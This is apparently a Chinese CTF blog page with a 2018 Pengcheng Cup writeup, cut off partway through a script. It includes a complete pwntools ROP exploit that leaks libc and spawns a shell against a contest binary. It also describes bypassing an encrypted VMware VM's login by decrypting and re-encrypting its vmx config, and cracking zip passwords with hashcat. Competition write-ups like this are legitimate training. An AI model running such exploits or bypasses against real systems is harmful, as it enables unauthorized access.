@@ -1,0 +1,1595 @@
+<!DOCTYPE html>
+<html  lang="zh">
+<head>
+    <meta charset="utf-8">
+<title>标签: 鹏程杯 - Junay的博客</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+
+
+    <meta name="description" content="CTF、网络安全爱好者">
+<meta name="keywords" content="CTF,网络安全">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Junay的博客">
+<meta property="og:url" content="http://yoursite.com/tags/鹏程杯/index.html">
+<meta property="og:site_name" content="Junay的博客">
+<meta property="og:description" content="CTF、网络安全爱好者">
+<meta property="og:locale" content="zh-CN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Junay的博客">
+<meta name="twitter:description" content="CTF、网络安全爱好者">
+
+
+
+
+
+<link rel="icon" href="/images/favicon.png">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">
+
+
+    
+    
+    
+    <style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+    
+
+    
+    
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+    
+
+    
+    
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+
+    
+    
+    
+    
+
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+<link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/logo.svg" alt="Junay的博客" height="28">
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">Home</a>
+                
+                <a class="navbar-item"
+                href="/archives">Archives</a>
+                
+                <a class="navbar-item"
+                href="/categories">Categories</a>
+                
+                <a class="navbar-item"
+                href="/tags">Tags</a>
+                
+                <a class="navbar-item"
+                href="/about/index.html">About</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                    
+                    
+                    <a class="navbar-item" target="_blank" title="Download on GitHub" href="https://github.com/delcoding">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                    
+                
+                
+                
+                <a class="navbar-item search" title="搜索" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-6-widescreen has-order-2 column-main"><div class="card">
+    <div class="card-content">
+        <nav class="breadcrumb" aria-label="breadcrumbs">
+        <ul>
+            <li><a href="/tags">标签</a></li>
+            <li class="is-active"><a href="#" aria-current="page">鹏程杯</a></li>
+        </ul>
+        </nav>
+    </div>
+</div>
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-12-02T14:05:56.000Z">2018-12-02</time>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    15 分钟 读完 (大约 2229 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2018/12/pcb-writeup/">PCB鹏程杯2018 writeup</a>
+            
+        </h1>
+        <div class="content">
+            <h2 id="overInt"><a href="#overInt" class="headerlink" title="overInt"></a>overInt</h2><blockquote>
+<p>附带大佬的writeup</p>
+</blockquote>
+<p>先过两关检测，然后有：<br><em>(&amp;v8 + v6) = v5;<br>v3 = (int </em>)(unsigned int)v5;<br>printf(“str_pos is %c\n”, v3);<br>可以一位位的修改栈上任意地址</p>
+<p>大佬说才100，只能写这么多了。完整exp如下：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack</span><br><span class="line">context(os=<span class="hljs-string">'linux'</span>,arch=<span class="hljs-string">'amd64'</span>,aslr = <span class="hljs-string">'False'</span>)</span><br><span class="line">local = <span class="hljs-number">1</span></span><br><span class="line">log_level=<span class="hljs-string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> local:</span><br><span class="line">	p = process(<span class="hljs-string">"./overInt"</span>)<span class="hljs-comment">#,env=&#123;'LD_PRELOAD':'./libc_x64.so.6'&#125;)</span></span><br><span class="line">	elf = ELF(<span class="hljs-string">"./overInt"</span>)</span><br><span class="line">	<span class="hljs-comment">#libc = ELF('./libc_x64.so.6')</span></span><br><span class="line"><span class="hljs-keyword">else</span>:</span><br><span class="line">	p = remote(<span class="hljs-string">'58.20.46.148'</span>,<span class="hljs-number">35272</span>)</span><br><span class="line">	elf = ELF(<span class="hljs-string">"./overInt"</span>)</span><br><span class="line">	<span class="hljs-comment">#libc = ELF('./libc_x64.so.6')</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change_addr</span><span class="hljs-params">(num,string)</span>:</span></span><br><span class="line">	j = <span class="hljs-number">0</span></span><br><span class="line">	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):</span><br><span class="line">		p.recvuntil(<span class="hljs-string">"Which position you want to modify?\n"</span>)</span><br><span class="line">		payload = p32(num)</span><br><span class="line">		p.send(payload)</span><br><span class="line">		p.recvuntil(<span class="hljs-string">"What content you want to write in?\n"</span>)</span><br><span class="line">		payload = string[j]</span><br><span class="line">		p.send(payload)</span><br><span class="line">		num += <span class="hljs-number">1</span></span><br><span class="line">		j += <span class="hljs-number">1</span></span><br><span class="line">		</span><br><span class="line">pop_rdi = <span class="hljs-number">0x0000000000400b13</span></span><br><span class="line">read_got = elf.got[<span class="hljs-string">"read"</span>] <span class="hljs-comment"># 0x602038</span></span><br><span class="line">alarm_got = elf.got[<span class="hljs-string">"alarm"</span>] <span class="hljs-comment"># 0x602030</span></span><br><span class="line">start = <span class="hljs-number">0x4005D0</span></span><br><span class="line">puts_plt = elf.plt[<span class="hljs-string">"puts"</span>] <span class="hljs-comment"># 0x40054c</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="hljs-string">"Please set arrary number:"</span>)</span><br><span class="line">p.send(<span class="hljs-string">"over"</span>)</span><br><span class="line">p.recvuntil(<span class="hljs-string">"How many numbers do you have?\n"</span>)</span><br><span class="line">p.send(p32(<span class="hljs-number">10</span>))</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">9</span>):</span><br><span class="line">	data = p.recv()</span><br><span class="line">	p.send(p32(<span class="hljs-number">0</span>))</span><br><span class="line">p.recv() </span><br><span class="line">p.send(p32(<span class="hljs-number">0x20633372</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="hljs-string">"How many positions you want to modify?\n"</span>)</span><br><span class="line">p.send(p32(<span class="hljs-number">32</span>))</span><br><span class="line"></span><br><span class="line">string = <span class="hljs-string">"\x13\x0b\x40\x00\x00\x00\x00\x00"</span> <span class="hljs-comment">#pop_rdi</span></span><br><span class="line">change_addr(<span class="hljs-number">0x38</span>,string)</span><br><span class="line">string = <span class="hljs-string">"\x38\x20\x60\x00\x00\x00\x00\x00"</span> <span class="hljs-comment">#read_got</span></span><br><span class="line">change_addr(<span class="hljs-number">0x40</span>,string)</span><br><span class="line">string = <span class="hljs-string">"\x4c\x05\x40\x00\x00\x00\x00\x00"</span> <span class="hljs-comment">#puts_plt</span></span><br><span class="line">change_addr(<span class="hljs-number">0x48</span>,string)</span><br><span class="line">string = <span class="hljs-string">"\xd0\x05\x40\x00\x00\x00\x00\x00"</span> <span class="hljs-comment">#start</span></span><br><span class="line">change_addr(<span class="hljs-number">0x50</span>,string)</span><br><span class="line">p.recvuntil(<span class="hljs-string">"!"</span>)</span><br><span class="line">data = p.recvuntil(<span class="hljs-string">"\n"</span>,drop=<span class="hljs-keyword">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>)</span><br><span class="line">data = u64(data)</span><br><span class="line">libc_base = data - <span class="hljs-number">0x0f7250</span></span><br><span class="line">binsh_addr = libc_base + <span class="hljs-number">0x18cd57</span></span><br><span class="line">system_addr = libc_base + <span class="hljs-number">0x045390</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="hljs-string">"Please set arrary number:"</span>)</span><br><span class="line">p.send(<span class="hljs-string">"over"</span>)</span><br><span class="line">p.recvuntil(<span class="hljs-string">"How many numbers do you have?\n"</span>)</span><br><span class="line">p.send(p32(<span class="hljs-number">10</span>))</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">9</span>):</span><br><span class="line">	data = p.recv()</span><br><span class="line">	p.send(p32(<span class="hljs-number">0</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p32(<span class="hljs-number">0x20633372</span>))</span><br><span class="line">p.recvuntil(<span class="hljs-string">"How many positions you want to modify?\n"</span>)</span><br><span class="line">p.send(p32(<span class="hljs-number">24</span>))</span><br><span class="line">string = <span class="hljs-string">"\x13\x0b\x40\x00\x00\x00\x00\x00"</span> <span class="hljs-comment">#pop_rdi</span></span><br><span class="line">change_addr(<span class="hljs-number">0x38</span>,string)</span><br><span class="line">string = pack(<span class="hljs-string">'L'</span>,binsh_addr)</span><br><span class="line">change_addr(<span class="hljs-number">0x40</span>,string)</span><br><span class="line">string = pack(<span class="hljs-string">'L'</span>,system_addr)</span><br><span class="line">change_addr(<span class="hljs-number">0x48</span>,string)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<h2 id="hack1t"><a href="#hack1t" class="headerlink" title="hack1t"></a>hack1t</h2><p>打开虚拟机发现需要密码，把题目描述中的<code>bibinb</code>输入进行就行。</p>
+<div align="center"><br>    <img src="/images/posts/pcb/1.png"><br></div>
+
+<p>打开虚拟机后发现需要用户账号密码才进得去，随便试了一下都以失败告终，所以考点就是绕过用户验证，按常规套路来说在系统启动是强行进入<code>GRUB</code>，然后改密码，但发现进<code>GRUB</code>也需要密码：</p>
+<div align="center"><br>    <img src="/images/posts/pcb/2.png"><br></div>
+
+<p>所以这条路也行不通，那么另一个思路就是在加载系统时加载一个<code>ISO</code>，然后进入系统，再ISO镜像中对原来的硬盘进行操作。但发现修改虚拟机配置需要密码，而这个密码跟上面的不一样。</p>
+<div align="center"><br>    <img src="/images/posts/pcb/3.png"><br></div>
+
+<p>所以这条路暂时也没辙了。回过头查看下虚拟机的配置文件如<code>vmx、nvram</code>等，发现都已经被加密，正常的配置文件是键值对存储，而加密后的则如下：</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.encoding = &quot;UTF-8&quot;</span><br><span class="line">displayName = &quot;Ubuntu 64-bit&quot;</span><br><span class="line">policy.vm.sourcevmid = &quot;52 b5 65 b9 89 e2 54 bf-e2 ee e6 99 1f 9d 2d 29&quot;</span><br><span class="line">encryption.keySafe = &quot;vmware:key/list/(pair/(phrase/a%2bFUjt......))&quot;</span><br><span class="line">encryption.data = &quot;A8Y2HMBeynR9AnL.....&quot;</span><br></pre></td></tr></table></figure>
+<p>因为虚拟机的配置是通过文件来实现的，所以如果我们能直接修改配置文件也能达到我们想要的结果，经过一番搜索后找到了一些有用的资料，在VMware的社区上发现了一个issue，有个大神实现了对vmx加密算法的破解和运用，并且发布到了GitHub中。</p>
+<ul>
+<li><a href="https://communities.vmware.com/thread/582158" target="_blank">issue链接</a></li>
+<li><a href="https://github.com/RF3/VMwareVMX" target="_blank">GitHub项目</a></li>
+</ul>
+<p>当然使用这个工具解密是会<code>Will ask for the password</code>，但我们还是可以再碰一下bibinb这个密码。</p>
+<p>其实这个工具很早就下下来了，但当时不会用，其实是它的脚本写的有瑕疵，坑爹了，给我报了个error：</p>
+<div align="center"><br>    <img src="/images/posts/pcb/4.png"><br></div>
+
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: Cannot read from file Ubuntu 64-bit.vmx.bak</span><br></pre></td></tr></table></figure>
+<p>但拿去操作正常的vmx文件又是可以的，当时也没怎么多想，就把工具放在了一边，继续找资料，但后来就觉得这个错误或许可以跟一下，而正是这个决定让我拿下这题。打开<code>main.py</code>，很容易就发现了问题所在，程序进来后会判断：</p>
+<figure class="highlight py hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:</span><br><span class="line">    <span class="hljs-keyword">if</span> displayname <span class="hljs-keyword">is</span> <span class="hljs-keyword">None</span>:</span><br><span class="line">        match = re.match(<span class="hljs-string">'displayName *= *"(.+)"\n'</span>, line)</span><br><span class="line">        <span class="hljs-keyword">if</span> match:</span><br><span class="line">            displayname = match.group(<span class="hljs-number">1</span>)</span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-string">'encryption.keySafe'</span> <span class="hljs-keyword">in</span> line:</span><br><span class="line">        keysafe = line</span><br><span class="line">    <span class="hljs-keyword">elif</span> <span class="hljs-string">'encryption.data'</span> <span class="hljs-keyword">in</span> line:</span><br><span class="line">        data = line</span><br></pre></td></tr></table></figure>
+<p>而在观察中发现它给的<code>displayname</code>是小写，而判断是大写，直接改一下试试：</p>
+<div align="center"><br>    <img src="/images/posts/pcb/5.png"><br></div>
+
+<p>改好后直接跑，发现成功解密出配置：</p>
+<div align="center"><br>    <img src="/images/posts/pcb/6.png"><br></div>
+
+<p>那么接下来就好办了，先在其他虚拟机上配置一个<code>CDROM</code>，看一下它的vmx配置文件怎么写，然后我们照抄过来，然后在加密回去就行，下面是配置cdrom：</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sata0:1.deviceType = &quot;cdrom-image&quot;</span><br><span class="line">sata0:1.fileName = &quot;E:\kali-linux-2018.1-i386.iso&quot;</span><br><span class="line">sata0:1.present = &quot;TRUE&quot;</span><br><span class="line">usb.present = &quot;TRUE&quot;    # USB开启</span><br></pre></td></tr></table></figure>
+<p>然后在把解密出来的文件中的中文随便改成什么英文，防止python的编码错误。</p>
+<figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 main.py -e -D <span class="hljs-string">"Ubuntu 64-bit"</span> -p bibinb reconver.vmx myencry.vmx</span><br></pre></td></tr></table></figure>
+<p>改好后替换掉原来的文件，然后在虚拟机配置中就能看到cdrom和USB已被开启。</p>
+<div align="center"><br>    <img src="/images/posts/pcb/7.png"><br></div>
+
+<p>紧接着在虚拟机启动时按<code>ESC</code>选择从<code>CD-ROM</code>中启动，这样就能进去系统，从而操作文件系统。</p>
+<p>将四个部分的rar压缩包放在同一个文件夹，然后解压：</p>
+<div align="center"><br>    <img src="/images/posts/pcb/8.png"><br></div>
+
+<p>拿到flag。</p>
+<h2 id="Traffic-Light"><a href="#Traffic-Light" class="headerlink" title="Traffic_Light"></a>Traffic_Light</h2><p>这是一个交通灯的<code>gif</code>，用<code>file</code>、<code>binwalk</code>检查后都很正常，猜测可能是灯的闪烁代表0,1。网上找了个分离每帧git的python脚本：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image</span><br><span class="line"><span class="hljs-keyword">import</span> os</span><br><span class="line">gifFileName = <span class="hljs-string">'Traffic_Light.gif'</span></span><br><span class="line"><span class="hljs-comment">#使用Image模块的open()方法打开gif动态图像时，默认是第一帧</span></span><br><span class="line">im = Image.open(gifFileName)</span><br><span class="line">pngDir = gifFileName[:<span class="hljs-number">-4</span>]</span><br><span class="line"><span class="hljs-comment">#创建存放每帧图片的文件夹</span></span><br><span class="line">os.mkdir(pngDir)</span><br><span class="line"><span class="hljs-keyword">try</span>:</span><br><span class="line">  <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:</span><br><span class="line">    <span class="hljs-comment">#保存当前帧图片</span></span><br><span class="line">    current = im.tell()</span><br><span class="line">    im.save(pngDir+<span class="hljs-string">'/'</span>+str(current)+<span class="hljs-string">'.png'</span>)</span><br><span class="line">    <span class="hljs-comment">#获取下一帧图片</span></span><br><span class="line">    im.seek(current+<span class="hljs-number">1</span>)</span><br><span class="line"><span class="hljs-keyword">except</span> EOFError:</span><br><span class="line">    <span class="hljs-keyword">pass</span></span><br></pre></td></tr></table></figure></p>
+<p>结果得到1168个项目。。。</p>
+<div align="center"><br>    <img src="/images/posts/pcb/9.png"><br></div>
+
+<p>没想到快捷方法，，只能手动过了一遍得到，先把绿灯当做1，红灯为0，黄灯为空格：</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">10011001 10010011 10011110 10011000 10000100</span><br><span class="line">10101111 10010011 11001100 11001011 10001100</span><br><span class="line">11001100 10100000 10001111 11001011 10000110</span><br><span class="line">10100000 11001011 10001011 10001011 11001100</span><br><span class="line">10010001 10001011 11001110 11001111 10010001</span><br><span class="line">10100000 10001011 11001111 10100000 10001011</span><br><span class="line">10001101 11001011 10011001 10011001 11001110</span><br><span class="line">10011100 10100000 10001100 11001011 10011001</span><br><span class="line">11001100 10001011 10000110 10100000 10001000</span><br><span class="line">10010111 11001100 10010001 10100000 10000110</span><br><span class="line">11001111 10001010 10100000 11001011 10001101</span><br><span class="line">11001100 10100000 11001111 10001010 10001011</span><br><span class="line">10001100 11001110 10011011 11001100 10000010</span><br></pre></td></tr></table></figure>
+<p>结果也发现每8个红绿灯就有一个黄灯，刚好分隔开，写个脚本跑一下：</p>
+<figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">f= open(<span class="hljs-string">'./temp'</span>, <span class="hljs-string">'r'</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="hljs-string">''</span></span><br><span class="line"><span class="hljs-keyword">for</span> oneline <span class="hljs-keyword">in</span> f.readlines():</span><br><span class="line">    numbers = oneline.split(<span class="hljs-string">' '</span>)</span><br><span class="line">    <span class="hljs-keyword">for</span> one <span class="hljs-keyword">in</span> numbers:</span><br><span class="line">        one = one.replace(<span class="hljs-string">'1'</span>,<span class="hljs-string">'2'</span>).replace(<span class="hljs-string">'0'</span>,<span class="hljs-string">'1'</span>).replace(<span class="hljs-string">'2'</span>,<span class="hljs-string">'0'</span>)</span><br><span class="line">        flag += chr(int(one, <span class="hljs-number">2</span>))</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+<p>上面之所以做了替换时因为绿灯跟红灯代表的0/1给弄反了。。</p>
+<h2 id="What’s-this"><a href="#What’s-this" class="headerlink" title="What’s_this"></a>What’s_this</h2><p>Binwalk后发现有很多东西：</p>
+<div align="center"><br>    <img src="/images/posts/pcb/10.png"><br></div>
+
+<p>Foremost后可以得到:</p>
+<div align="center"><br>    <img src="/images/posts/pcb/11.png"><br></div>
+
+<p>其中zip2.zip是加密的，而且里面有一个2-stage的文件，再看上面得到了，容易联想到明文攻击。</p>
+<div align="center"><br>    <img src="/images/posts/pcb/12.png"><br></div>
+
+<p>我们把上面的2-stage.what的what去掉，然后用Ubuntu自带的<code>zip</code>去压缩，7z和WinRAR压缩出来的<code>都不行</code>，ARCHPR识别不了。最后密码是Hello_Hi。</p>
+<div align="center"><br>    <img src="/images/posts/pcb/13.png"><br></div>
+
+<p>但flowerdance的内容令人失望，并没有有价值的东西。</p>
+<div align="center"><br>    <img src="/images/posts/pcb/14.png"><br></div>
+
+<p>File一下2-stage可以发现是jpg，直接改成jpg。</p>
+<div align="center"><br>    <img src="/images/posts/pcb/15.png"><br></div>
+
+<p>再根据提示用cloacked-pixel对这个图片进行处理，使用：</p>
+<div align="center"><br>    <img src="/images/posts/pcb/16.png"><br></div>
+
+<p>可以得到一个zip文件，内容如下：</p>
+<div align="center"><br>    <img src="/images/posts/pcb/17.png"><br></div>
+
+<p>但zip3、zip4都需要密码。前面得到的密码都对不上，而且发现这里zip3.zip中的guess文件只有4字节，可以考虑CRC32碰撞攻击。</p>
+<div align="center"><br>    <img src="/images/posts/pcb/18.png"><br></div>
+
+
+<p>这里使用<code>hashcat</code>神器，<code>-D 2</code>表示<code>GPU</code>破解。<br><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\hashcat64.exe -a 3 -m 11500 -D 2 --force --increment --increment-min 4 --increment-max 6 --force 99bed60e:00000000 ?a ?a?a?a?a?a</span><br></pre></td></tr></table></figure></p>
+<div align="center"><br>    <img src="/images/posts/pcb/19.png"><br></div>
+
+<p>结果只需<code>2s</code>，神器不亏是神器。。。</p>
+<p>但密码不是zip3的，是zip4的。。然而还是没惊喜</p>
+<div align="center"><br>    <img src="/images/posts/pcb/20.png"><br></div>
+
+<p>回头再看那个docx文件，突然发现还有隐藏的东西：</p>
+<div align="center"><br>    <img src="/images/posts/pcb/21.png"><br></div>
+
+<p>直接将docx改成zip提取嵌入对象，在media里有新的东西：</p>
+<div align="center"><br>    <img src="/images/posts/pcb/22.png"><br></div>
+
+<p>其中image1.emf能打开，而i_love_you.emf却不行，但观察它的文件结尾，可以看到是zip的格式，binwalk也得出zip end。</p>
+<div align="center"><br>    <img src="/images/posts/pcb/23.png"><br></div>
+
+<p>在观察发现i_love_you.emf跟zip4.zip的文件大小相同，考虑异或一下两个文件，这里直接Google代码：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="hljs-keyword">import</span> binascii</span><br><span class="line"><span class="hljs-keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 每个字节转成hex，0x顺便去掉，对于不足两位的补0</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str2hex</span><span class="hljs-params">(str)</span>:</span></span><br><span class="line">    hexs = []</span><br><span class="line">    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> str:</span><br><span class="line">        tmp = (hex(ord(s)).replace(<span class="hljs-string">'0x'</span>, <span class="hljs-string">''</span>))</span><br><span class="line">        <span class="hljs-keyword">if</span> len(tmp) == <span class="hljs-number">2</span>:</span><br><span class="line">            hexs.append(tmp)</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            hexs.append(<span class="hljs-string">'0'</span> + tmp)</span><br><span class="line">    <span class="hljs-keyword">return</span> hexs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">arr = [<span class="hljs-string">'0'</span>, <span class="hljs-string">'1'</span>, <span class="hljs-string">'2'</span>, <span class="hljs-string">'3'</span>, <span class="hljs-string">'4'</span>, <span class="hljs-string">'5'</span>, <span class="hljs-string">'6'</span>, <span class="hljs-string">'7'</span>, <span class="hljs-string">'8'</span>, <span class="hljs-string">'9'</span>, <span class="hljs-string">'a'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'c'</span>, <span class="hljs-string">'d'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'f'</span>]</span><br><span class="line">arr2 = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">15</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tran</span><span class="hljs-params">(r)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(arr)):</span><br><span class="line">        <span class="hljs-keyword">if</span> r == arr[i]:</span><br><span class="line">            <span class="hljs-keyword">return</span> arr2[i]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = open(<span class="hljs-string">'D:\\CTF\\pcb\\whatis\\output\\zip\\docx\\word\\media\\I_Love_You.emf'</span>, <span class="hljs-string">'rb'</span>)</span><br><span class="line">f2 = open(<span 